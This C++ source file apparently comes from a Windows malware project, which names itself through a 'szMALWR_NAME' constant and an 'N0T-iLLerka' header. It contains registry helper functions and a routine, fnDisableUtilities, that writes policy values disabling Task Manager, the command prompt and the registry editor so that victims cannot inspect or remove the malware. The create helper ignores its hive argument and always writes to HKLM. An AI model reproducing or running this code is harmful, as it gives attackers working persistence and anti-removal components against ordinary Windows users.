#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
) {
	HKEY hKey;
	LSTATUS lsRKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		RegCloseKey(hKey);
		return TRUE;
	} else {
		SetLastError(lsRKey);
		fnERRORHANDLERW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
			L"RegOpenKeyExW", MB_ICONWARNING);
	}

	// If HKLM can't be read try HKCU
	lsRKey = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		RegCloseKey(hKey);
		return TRUE;
	} else {
		SetLastError(lsRKey);
		fnERRORHANDLERW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
			L"RegOpenKeyExW", MB_ICONERROR);
	}

	RegCloseKey(hKey);
	return FALSE;
}

BOOL fnCreateRegistryKeyW(
	_In_ HKEY hKeyHK,
	_In_ LPCWSTR lpSubKey,
	_In_ BOOL wow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD dwType,
	_In_opt_ DWORD dwValue
) {
	REGSAM _wow32;
	if (wow32) {
		_wow32 = KEY_WOW64_32KEY;
	} else {
		_wow32 = NULL;
	}

	HKEY hKey;
	if (!RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | _wow32, NULL, &hKey, NULL)) {
		if (lpValueName) {
			if (!RegSetValueEx(hKey, lpValueName, 0, dwType, (LPBYTE)&dwValue, sizeof(DWORD))) {
				RegCloseKey(hKey);
				return TRUE;
			} else {
				fnERRORHANDLERW(L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
					L"RegSetValueExW", MB_ICONWARNING, dwType, lpValueName, dwValue);
			}
		}
	} else {
		fnERRORHANDLERW(L"Couldn't create Registry Key\nKey: %s", NULL, L"RegCreateKeyExW", MB_ICONWARNING, lpSubKey);
	}

	RegCloseKey(hKey);
	return FALSE;
}

#if DISABLE_PROTECTIONS == FALSE
BOOL fnDisableUtilities(VOID) {
	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
	}

	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}
	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
	}

	return TRUE;
}
#endif // !DISABLE_PROTECTIONS